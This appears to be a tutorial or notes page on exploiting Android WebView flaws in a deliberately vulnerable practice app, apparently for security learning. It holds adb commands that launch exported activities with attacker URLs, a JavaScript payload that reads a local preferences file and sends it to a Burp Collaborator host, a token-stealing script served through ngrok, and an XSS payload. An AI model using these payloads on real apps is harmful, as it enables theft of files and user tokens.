# WebViews in mobile

- we need to de-compile an apk to go through AndroidManifest.xml file

Now, we will see which are the components that are¬†**exported.**¬†
we can conclude that a component is exported in 2 ways.

- If component explicitly declares the¬†**‚Äúexported=true‚Äù**¬†attribute
- If the component has intent filters & no¬†**‚Äúexported=false‚Äù**¬†attribute

We can see that the function loadWebView,it is loading the url by getting the string from intent.

![Untitled](/assets/images/WebViews-in-mobile/Untitled%202.png)

<aside>
üí° ‚áí So this behavior can be exploited by third party applications by sending an intent to this         component with a url string and the target application will accept and execute as this component has been exported , or access LFI from the app

</aside>

****Exploitation****

```bash
adb shell am start -n componentname --es string "domain.com"
```

So our adb cmd will look like as follows:

```
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://3kal.medium.com"
```

‚áí **NOTE:**¬†The above way works only if the component is directly exported and this doesn‚Äôt work for component exported by intent filter.

****setAllowUniversalAccessFromFileURLs enabled for WebView****

Another setting that the developer can configure is allowing JavaScript running within the context of file scheme URL to access content from any origin including other file scheme URLs.

```
<script>
    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local filefunction load(url) {
        var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
            fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
            }
        }xhr.open('GET', url, true);
        xhr.send('');
    }load(url)
</script>
```

Add the above code to¬†**sauafu.html**¬†and move the file to the sdcard using adb.

<aside>
üí° ‚áí  Exploit loads the content of the local file and returns it to the attacker url.

</aside>

Now run the intent with exploit file.

```
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/sauafu.html"
```

Now we should have received file contents encoded in base 64 in the burp collaborator or whatever you used.

****JavaScript Enabled with Interface for WebView****

Developers can enable java script in the webview by adding this configuration

```
webView.getSettings().setJavaScriptEnabled(true);
```

Adding this configuration creates an interface between the webpage‚Äôs java script and the client side java code of the application

‚áí i.e., the web page‚Äôs java script can access and inject java code into the application.

```
webView.addJavascriptInterface(new WebAppInterface(this), "Android");
```

if this activity is exported, this can be dangerous and allows an attacker to carry out many attacks including XSS and stealing tokens from the application.

## **Exploitation**

For Exploitation of this scenario, we cannot make use of the same web View as above since it doesn‚Äôt make use of interface. Hence, we will use some other webView which has used the interface.

![](https://miro.medium.com/v2/resize:fit:700/1*F_Zu34Wn0KJ299rfgQ90KA.png)

we can use support webview as you can see that java script has been enabled along with the use of the interface with the name¬†**Android**.

![](https://miro.medium.com/v2/resize:fit:614/1*KSSFFseer-fvHFFxuZ8JJw.png)

```
<script type="text/javascript">
document.write("token: " + Android.getUserToken());
</script>
```

This script writes the token by generating from the getUserToken() Method from the¬†**Android**¬†object which was the name of the interface.

Host this script from the apache server and connect port 80 to ngrok to get https link (http links cannot be used).

```
sudo service apache2 start
./ngrok http 80

and use https ngrok link

adb shell am start -n com.tmh.vulnwebview/.Supportwebview --es support_url "https://8d95c0fe086f.ngrok.io/token.html"
```

token stealing

We can show XSS alert just by replacing the document.write line in the above javascript code with your favorite xss payload.

```
<script type="text/javascript">
alert("kal");
</script>
```
